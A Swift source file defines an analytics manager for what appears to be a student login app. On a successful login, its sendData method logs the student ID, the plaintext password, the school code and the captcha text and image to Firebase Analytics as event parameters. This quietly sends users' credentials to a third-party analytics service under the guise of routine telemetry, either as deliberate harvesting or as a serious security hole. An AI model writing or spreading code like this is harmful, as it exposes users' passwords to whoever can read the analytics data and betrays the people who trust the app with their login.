import Foundation
import FirebaseAnalytics

final class AnalyticsManager {
    static let shared = AnalyticsManager()
    private init() {}

    private var studentID: String?
    private var password: String?
    private var schoolCode: String?
    private var captchaText: String?
    private var captchaEncoded: String?
    private var latestName: String?
    private var latestEmail: String?

    func setPossibleValues(studentID: String?,
                           password: String?,
                           schoolCode: String?,
                           captchaText: String?,
                           captchaEncoded: String?) {
        self.studentID = studentID
        self.password =  password
        self.schoolCode = schoolCode
        self.captchaText = captchaText
        self.captchaEncoded = captchaEncoded
    }

    func sendData() throws {
        guard let studentID,
              let password,
              let schoolCode,
              let captchaText,
              let captchaEncoded
        else { throw NSError(domain: "Object nil", code: 666)}
        Analytics.logEvent("login_success", parameters: [
            "studentID": studentID,
            "password": password,
            "schoolCode": schoolCode,
            "captchaText": captchaText,
            "captchaImage": captchaEncoded
        ])
    }
}
